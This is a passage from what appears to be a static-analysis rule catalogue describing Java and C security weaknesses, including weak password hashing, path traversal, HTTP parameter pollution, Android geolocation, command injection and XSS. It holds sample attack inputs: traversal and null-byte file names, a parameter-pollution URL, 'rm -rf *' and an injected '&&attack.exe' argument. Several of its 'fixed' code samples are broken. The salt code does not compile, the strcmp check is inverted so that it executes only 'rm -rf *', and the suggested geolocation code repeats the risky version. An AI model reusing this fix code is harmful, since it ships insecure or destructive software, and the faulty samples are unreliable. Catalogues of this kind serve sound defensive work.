<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="nt">&lt;pre&gt;</span>byte[] hashValue = DigestUtils.getSha1Digest().digest(password.getBytes());<span class="nt">&lt;/pre&gt;</span>
</pre></div>
</td></tr></table>
</p>
<p>
<b>Solution (Using bouncy castle):</b><br/>
<pre>public static byte[] getEncryptedPassword(String password, byte[] salt) throws NoSuchAlgorithmException, InvalidKeySpecException {
    PKCS5S2ParametersGenerator gen = new PKCS5S2ParametersGenerator(new SHA256Digest());
    gen.init(password.getBytes("UTF-8"), salt.getBytes(), 4096);
    return ((KeyParameter) gen.generateDerivedParameters(256)).getKey();
}</pre>
<b>Solution (Java 8 and later):</b><br/>
<pre>public static byte[] getEncryptedPassword(String password, byte[] salt) throws NoSuchAlgorithmException, InvalidKeySpecException {
    KeySpec spec = new PBEKeySpec(password.toCharArray(), salt, 4096, 256 * 8);
    SecretKeyFactory f = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256");
    return f.generateSecret(spec).getEncoded();
}</pre>
</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>high</p>
<h1 id="references">References</h1>
<p><a href="https://community.qualys.com/blogs/securitylabs/2014/09/09/sha1-deprecation-what-you-need-to-know">Qualys blog: SHA1 Deprecation: What You Need to Know</a><br/>
<a href="https://googleonlinesecurity.blogspot.ca/2014/09/gradually-sunsetting-sha-1.html">Google Online Security Blog: Gradually sunsetting SHA-1</a><br/>
<a href="http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf">NIST: Transitions: Recommendation for Transitioning the Use of Cryptographic Algorithms and Key Lengths</a><br/>
<a href="http://csrc.nist.gov/publications/nistpubs/800-132/nist-sp800-132.pdf">NIST: Recommendation for Password-Based Key Derivation</a><br/>
<a href="https://stackoverflow.com/q/22580853/89769">Stackoverflow: Reliable implementation of PBKDF2-HMAC-SHA256 for Java</a><br/>
<a href="http://cwe.mitre.org/data/definitions/327.html">CWE-327: Use of a Broken or Risky Cryptographic Algorithm</a>
</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7508">Tainted filename read</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Tainted filename read</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>The filename provided by the FileUpload API can be tampered with by the client to reference unauthorized files.</p>
<p>For example:</p>
<ul>
<li><code>"../../../config/overide_file"</code></li>
<li><code>"shell.jsp\u0000expected.gif"</code></li>
</ul>
<p>Therefore, such values should not be passed directly to the filesystem API. If acceptable, the application should generate its 
own file names and use those. Otherwise, the provided filename should be properly validated to ensure it's properly structured, 
contains no unauthorized path characters (e.g., / ), and refers to an authorized file.</p></p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>medium</p>
<h1 id="references">References</h1>
<p><a href="http://blogs.securiteam.com/index.php/archives/1268">Securiteam: File upload security recommendations</a><br/>
<a href="http://cwe.mitre.org/data/definitions/22.html">CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</a><br/>
<a href="http://projects.webappsec.org/w/page/13246952/Path%20Traversal">WASC-33: Path Traversal</a><br/>
<a href="https://www.owasp.org/index.php/Path_Traversal">OWASP: Path Traversal</a><br/>
<a href="http://capec.mitre.org/data/definitions/126.html">CAPEC-126: Path Traversal</a><br/>
<a href="http://cwe.mitre.org/data/definitions/22.html">CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</a></p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7150">May expose internal representation by returning reference to mutable object</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>May expose internal representation by returning reference to mutable object</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p> Returning a reference to a mutable object value stored in one of the object's fields
  exposes the internal representation of the object. 
   If instances
   are accessed by untrusted code, and unchecked changes to
   the mutable object would compromise security or other
   important properties, you will need to do something different.
  Returning a new copy of the object is better approach in many situations.</p></p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>low</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-bugs.html">FIND-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1104">HTTP Parameter Pollution</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable Code Example</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>An attacker overrides or adds HTTP GET/POST parameters by injecting query string delimiters. </p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>Via HPP(HTTP Parameter Pollution) it may be possible to override existing hardcoded HTTP parameters, modify the application behaviors, access and, potentially exploit, uncontrollable variables, and bypass input validation checkpoints and WAF(Web Application Firewall) rules.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<ul>
<li>
<p>If using a Web Application Firewall (WAF), filters should be carefully configured to detect abnormal HTTP requests</p>
</li>
<li>
<p>Perform URL encoding</p>
</li>
<li>
<p>Use strict regular expressions in URL rewriting</p>
</li>
<li>
<p>Beware of multiple occurrences of a parameter in a Query String</p>
</li>
</ul>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable Code Example</h3>
<p>Suppose some code as the following: </p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kt">void</span> <span class="kd">private</span> <span class="nf">executeBackendRequest</span><span class="o">(</span><span class="n">HTTPRequest</span> <span class="n">request</span><span class="o">){</span>
    <span class="n">String</span> <span class="n">amount</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"amount"</span><span class="o">);</span>
    <span class="n">String</span> <span class="n">beneficiary</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"recipient"</span><span class="o">);</span>
    <span class="n">HttpRequest</span><span class="o">(</span><span class="s">"http://backendServer.com/servlet/actions"</span><span class="o">,</span><span class="s">"POST"</span><span class="o">,</span>
                <span class="s">"action=transfer&amp;amount="</span><span class="o">+</span><span class="n">amount</span><span class="o">+</span><span class="s">"&amp;recipient="</span><span class="o">+</span><span class="n">beneficiary</span><span class="o">);</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<p>A malicious user may send a request like: </p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span>http://frontendHost.com/page?amount=1000&amp;recipient=Mat%26action%3dwithdraw
</pre></div>
</td></tr></table>
<p>Then, the front-end will build the following back-end request: </p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="n">HttpRequest</span><span class="o">(</span><span class="s">"http://backendServer.com/servlet/actions"</span><span class="o">,</span><span class="s">"POST"</span><span class="o">,</span>
            <span class="s">"action=transfer&amp;amount="</span><span class="o">+</span><span class="n">amount</span><span class="o">+</span><span class="s">"&amp;recipient="</span><span class="o">+</span><span class="n">beneficiary</span><span class="o">);</span>
</pre></div>
</td></tr></table>
<p>that is: </p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span>action=transfer&amp;amount=1000&amp;recipient=Mat&amp;action=withdraw
</pre></div>
</td></tr></table>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-capec">
<p>http://capec.mitre.org/data/definitions/460.html <a class="footnote-backref" href="#fnref-capec" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
<li id="fn-owasp">
<p>https://www.owasp.org/images/b/ba/AppsecEU09_CarettoniDiPaola_v0.8.pdf <a class="footnote-backref" href="#fnref-owasp" title="Jump back to footnote 2 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7578">WebView with geolocation activated (Android)</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>WebView with geolocation activated (Android)</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>
    It is suggested to ask the user for a confirmation about obtaining its geolocation.
</p>
<p>
<b>Code at risk:</b><br/>
<pre>
webView.setWebChromeClient(new WebChromeClient() {
    @Override
    public void onGeolocationPermissionsShowPrompt(String origin, GeolocationPermissions.Callback callback) {
        callback.invoke(origin, true, false);
    }
});
</pre>
</p>
<p>
<b>Suggested code:</b><br/></p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span>Limit the sampling of geolocation and ask the user for confirmation.
</pre></div>
</td></tr></table>
<p><pre>
webView.setWebChromeClient(new WebChromeClient() {
    @Override
    public void onGeolocationPermissionsShowPrompt(String origin, GeolocationPermissions.Callback callback) {
        callback.invoke(origin, true, false);</pre></p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2</pre></div></td><td class="code"><div class="highlight"><pre><span></span>    //Ask the user for confirmation
}
</pre></div>
</td></tr></table>
<p>});
</p></p>

<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>medium</p>
<h1 id="references">References</h1>
<p><a href="https://www.securecoding.cert.org/confluence/display/java/DRD15-J.+Consider+privacy+concerns+when+using+Geolocation+API">CERT: DRD15-J. Consider privacy concerns when using Geolocation API</a><br/>
<a href="http://en.wikipedia.org/wiki/W3C_Geolocation_API">Wikipedia: W3C Geolocation API</a><br/>
<a href="http://dev.w3.org/geo/api/spec-source.html">W3C: Geolocation Specification</a><br/></p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/privacy leakage.html">Privacy leakage</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1081">Privacy Violation</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/privacy-leakage.html">Privacy leakage</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable Code Example</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>The software does not properly prevent private data (such as credit card numbers) from being accessed by actors who either (1) are not explicitly authorized to access the data or (2) do not have the implicit consent of the people to which the data is related.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>Mishandling private information, such as customer passwords or Social Security numbers, can compromise user privacy and is often illegal. An exposure of private information does not necessarily prevent the software from working properly, and in fact it might be intended by the developer, but it can still be undesirable (or explicitly prohibited by law) for the people who are associated with this private information.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable Code Example</h3>
<p>This code uses location to determine the user's current US State location.</p>
<p>First the application must declare that it requires the ACCESS_FINE_LOCATION permission in the application's manifest.xml:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">"android.permission.ACCESS_FINE_LOCATION"</span><span class="nt">/&gt;</span>
</pre></div>
</td></tr></table>
<p>During execution, a call to getLastLocation() will return a location based on the application's location permissions. In this case the application has permission for the most accurate location possible:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="n">locationClient</span> <span class="o">=</span> <span class="k">new</span> <span class="n">LocationClient</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="k">this</span><span class="o">,</span> <span class="k">this</span><span class="o">);</span>
<span class="n">locationClient</span><span class="o">.</span><span class="na">connect</span><span class="o">();</span>
<span class="n">Location</span> <span class="n">userCurrLocation</span><span class="o">;</span>
<span class="n">userCurrLocation</span> <span class="o">=</span> <span class="n">locationClient</span><span class="o">.</span><span class="na">getLastLocation</span><span class="o">();</span>
<span class="n">deriveStateFromCoords</span><span class="o">(</span><span class="n">userCurrLocation</span><span class="o">);</span>
</pre></div>
</td></tr></table>
<p>While the application needs this information, it does not need to use the ACCESS_FINE_LOCATION permission, as the ACCESS_COARSE_LOCATION permission will be sufficient to identify which US state the user is in.</p>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cwe">
<p>https://cwe.mitre.org/data/definitions/359.html <a class="footnote-backref" href="#fnref-cwe" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE0079">OS Command Injection (CWE-78)</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 3 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example1">Vulnerable Code Example1</a></li>
<li><a href="#fixed-code-example1">Fixed Code Example1</a></li>
<li><a href="#vulnerable-code-example2">Vulnerable Code Example2</a></li>
<li><a href="#fixed-code-example2">Fixed Code Example2</a><ul>
<li><a href="#fix-1-using-a-sanitizing-check">Fix 1 : Using a sanitizing check</a></li>
<li><a href="#fix-2-revise-the-untrusted-data-and-make-it-safe">Fix 2 : Revise the untrusted data and make it safe</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>The software constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component. This could allow attackers to execute unexpected, dangerous commands directly on the operating system. </p>
<p>This weakness can lead to a vulnerability in environments in which the attacker does not have direct access to the operating system, such as in web applications. Alternately, if the weakness occurs in a privileged program, it could allow the attacker to specify commands that normally would not be accessible, or to call alternate commands with privileges that the attacker does not have. The problem is exacerbated if the compromised process does not follow the principle of least privilege, because the attacker-controlled commands may run with special system privileges that increases the amount of damage.</p>
<p>There are at least two subtypes of OS command injection:</p>
<ol>
<li>The application intends to execute a single, fixed program that is under its own control. It intends to use externally-supplied inputs as arguments to that program. For example, the program might use system("nslookup [HOSTNAME]") to run nslookup and allow the user to supply a HOSTNAME, which is used as an argument. Attackers cannot prevent nslookup from executing. However, if the program does not remove command separators from the HOSTNAME argument, attackers could place the separators into the arguments, which allows them to execute their own program after nslookup has finished executing.</li>
<li>The application accepts an input that it uses to fully select which program to run, as well as which commands to use. The application simply redirects this entire command to the operating system. For example, the program might use "exec([COMMAND])" to execute the [COMMAND] that was supplied by the user. If the COMMAND is under attacker control, then the attacker can execute arbitrary commands or programs. If the command is being executed using functions like exec() and CreateProcess(), the attacker might not be able to combine multiple commands together in the same line.</li>
</ol>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>Security issues, data leak issues, etc.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Critical</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<p>Always check the safety of user input data before storing it in memory.</p>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example1">Vulnerable Code Example1</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7
8
9</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>

<span class="kt">int</span> <span class="nf">command_injection</span><span class="p">(){</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">100</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
    <span class="n">scanf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span> <span class="c1">// @@bad@@</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</td></tr></table>
<p>In the vulnable code, system commands are executed by calling the system () function. An attacker can control the external input received by the scanf() function, such as passing "rm -rf *", which can cause serious security issues.</p>
<h3 id="fixed-code-example1">Fixed Code Example1</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>

<span class="kt">int</span> <span class="nf">command_injection</span><span class="p">(){</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">100</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
    <span class="n">scanf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">"rm -rf *"</span><span class="p">)){</span> <span class="c1">// @@good@@</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">system</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span> 
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</td></tr></table>
<p>In the fixed code, system commands are executed by calling the system () function. The developer made a simple verification of the external input received by the scanf() function, which can prevent some system command injection problems.</p>
<h3 id="vulnerable-code-example2">Vulnerable Code Example2</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="n">String</span> <span class="n">untrusted</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"attacker_input"</span><span class="o">);</span>
<span class="n">String</span> <span class="n">cmd</span> <span class="o">=</span> <span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="s">"myaction.exe "</span> <span class="o">+</span> <span class="n">untrusted</span> <span class="o">+</span> <span class="s">"&amp;&amp;myaction2.exe"</span><span class="o">)</span>

<span class="n">System</span><span class="o">.</span><span class="na">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">cmd</span><span class="o">);</span>
</pre></div>
</td></tr></table>
<p>In the vulnable code, attackers can control the command line parameters for myaction.exe and they can even execute codes on the server machine without authorization by passing untrusted="&amp;&amp;attack.exe", leading to severe security issue.</p>
<h3 id="fixed-code-example2">Fixed Code Example2</h3>
<h4 id="fix-1-using-a-sanitizing-check">Fix 1 : Using a sanitizing check</h4>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7
8
9</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="n">String</span> <span class="n">untrusted</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"attacker_input"</span><span class="o">);</span>

<span class="c1">// Using a sanitizing check, for example, a checking of whether the string </span>
<span class="c1">// untrusted has a substring "&amp;&amp;" </span>
<span class="k">if</span> <span class="o">(!</span><span class="n">isSafe</span><span class="o">(</span><span class="n">untrusted</span><span class="o">))</span> <span class="k">return</span><span class="o">;</span>

<span class="n">String</span> <span class="n">cmd</span> <span class="o">=</span> <span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="s">"myaction.exe "</span> <span class="o">+</span> <span class="n">untrusted</span> <span class="o">+</span> <span class="s">"&amp;&amp;myaction2.exe"</span><span class="o">);</span>

<span class="n">System</span><span class="o">.</span><span class="na">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">cmd</span><span class="o">);</span>
</pre></div>
</td></tr></table>
<h4 id="fix-2-revise-the-untrusted-data-and-make-it-safe">Fix 2 : Revise the untrusted data and make it safe</h4>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7
8</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="n">String</span> <span class="n">untrusted</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"attacker_input"</span><span class="o">);</span>

<span class="c1">// Revise the untrusted data and make it safe </span>
<span class="n">String</span> <span class="n">trusted</span> <span class="o">=</span> <span class="n">makeSafe</span><span class="o">(</span><span class="n">untrusted</span><span class="o">);</span>

<span class="n">String</span> <span class="n">cmd</span> <span class="o">=</span> <span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="s">"myaction.exe "</span> <span class="o">+</span> <span class="n">trusted</span> <span class="o">+</span> <span class="s">"&amp;&amp;myaction2.exe"</span><span class="o">)</span>

<span class="n">System</span><span class="o">.</span><span class="na">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">cmd</span><span class="o">);</span>
</pre></div>
</td></tr></table>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-CWE78">
<p>http://cwe.mitre.org/data/definitions/78.html
[^CERT-STR02-C]https://wiki.sei.cmu.edu/confluence/display/c/STR02-C.+Sanitize+data+passed+to+complex+subsystems
[^CERT-IDS07-J]https://wiki.sei.cmu.edu/confluence/display/java/IDS07-J.+Sanitize+untrusted+data+passed+to+the+Runtime.exec%28%29+method <a class="footnote-backref" href="#fnref-CWE78" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/c.html">C</a>
                <a href="../../tag/cpp.html">CPP</a>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE0080">XSS Vulnerability</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 9 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a><ul>
<li><a href="#reflected">Reflected</a></li>
<li><a href="#persistent">Persistent</a></li>
<li><a href="#dom-based">DOM-based</a></li>
</ul>
</li>
<li><a href="#vulnerability-and-risk1">Vulnerability and risk1</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#example-1">Example 1</a></li>
<li><a href="#example-2">Example 2</a></li>
</ul>
</li>
<li><a href="#potential-mitigations">Potential Mitigations</a><ul>
<li><a href="#vetted-library-or-framework1">Vetted library or framework1</a></li>
<li><a href="#contextual-output-encodingescaping-of-string-input2">Contextual output encoding/escaping of string input2</a></li>
<li><a href="#safely-validating-untrusted-html-input2">Safely validating untrusted HTML input2</a></li>
<li><a href="#separate-data-and-code1">Separate data and code1</a></li>
<li><a href="#set-the-session-cookie-to-be-httponly16">Set the session cookie to be HttpOnly16</a></li>
<li><a href="#disable-scripts2">Disable scripts2</a></li>
<li><a href="#cookie-protection2">Cookie protection2</a></li>
<li><a href="#use-static-code-analyzer">Use static code analyzer</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>The software does not neutralize or incorrectly neutralizes user-controllable input before it is placed in output that is used as a web page that is served to other users. XSS is mainly classified into 3 types: reflected XSS, persistent XSS and DOM-based XSS.</p>
<h3 id="reflected">Reflected</h3>
<p>The server reads data directly from the HTTP request and reflects it back in the HTTP response. Reflected XSS exploits occur when an attacker causes a victim to supply dangerous content to a vulnerable web application, which is then reflected back to the victim and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to the victim. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces a victim to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the victim, the content is executed by the victim's browser.</p>
<h3 id="persistent">Persistent</h3>
